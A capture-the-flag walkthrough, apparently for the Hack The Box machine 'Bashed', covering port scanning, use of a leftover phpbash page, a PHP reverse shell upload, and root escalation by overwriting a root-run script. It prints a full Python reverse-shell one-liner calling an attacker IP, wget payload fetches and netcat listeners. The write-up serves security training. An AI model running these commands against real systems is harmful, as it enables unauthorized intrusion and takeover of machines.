* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)

![alt text](./img/bashed00.PNG?raw=true)  

## Recon-Enumeration  
sudo masscan -p1-65535 10.10.10.68 -e tun0 --rate=1000  
![alt text](./img/bashed01.PNG?raw=true)  

nmap -A -p 80 10.10.10.68  
![alt text](./img/bashed02.PNG?raw=true)  

gobuster dir -u http://10.10.10.68 -w ~/wordlists/big.txt -t 100 -e -x html,php,xml,txt,db,sh,exe,log  
![alt text](./img/bashed03.PNG?raw=true)  

## Exploit  
Ok….that /dev look’s interesting  
![alt text](./img/bashed04.PNG?raw=true)  

Oh…..the developer left some samples of his phpbash page on the server. So we can use it to gain access  
Just select one of the pages  
![alt text](./img/bashed05.PNG?raw=true)  

Now just grab the first flag  
![alt text](./img/bashed06.PNG?raw=true)  

sudo -l  
![alt text](./img/bashed07.PNG?raw=true)  

Well we can run some commands, however we need a tty. So let’s try to upload a php reverse shell  
You can use this code [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), just don’t forget to change de IP and port to yours!!!

Go to the UPLOAD folder “cd /var/www/html/uploads” and wget the php file  
![alt text](./img/bashed08.PNG?raw=true)  

Start a netcat listener “nc -nvlp PORT_YOU_PUT_ON_REVERSE_PHP” and access the page  
10.10.10.68/uploads/rev.php  
![alt text](./img/bashed09.PNG?raw=true)  
HABEMUS SHELL \o/  

## Privesc  
Run the above command to get  better shell  
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  

With the “sudo -l” we notice that we can run any command as scriptmanager, so let’s change the user  
sudo -u scriptmanager /bin/bash  
![alt text](./img/bashed10.PNG?raw=true)  

Let’s do some basic enumeration  
find / -user scriptmanager 2>/dev/null  
![alt text](./img/bashed11.PNG?raw=true)    

This scripts folder looks curious  
![alt text](./img/bashed12.PNG?raw=true)  
  
![alt text](./img/bashed13.PNG?raw=true)  

Ok, so the test.py open the test.txt and overwrite it. However root owns the test.txt, that means in some point the test.py is executed by root.  
After checking again the test.txt time has changed  
![alt text](./img/bashed14.PNG?raw=true)  

So there is an automation running the test.py as root. So we can change it’s content to a python reverse shell.   
The code on [this site](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) works fine  
> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);  

- Put this code on a file, i named aaa.txt  
- Then start a server to get the file on target machine  
- Go to /scripts and get the file “wget http://10.10.14.2/aaa.txt”  
- Then use the above code to overwrite the test.py file:  
- cat aaa.txt > test.py  

![alt text](./img/bashed17.PNG?raw=true)  

Start a netcat listener and wait  
![alt text](./img/bashed15.PNG?raw=true)  
  
Now just grab the flag  
![alt text](./img/bashed16.PNG?raw=true)  
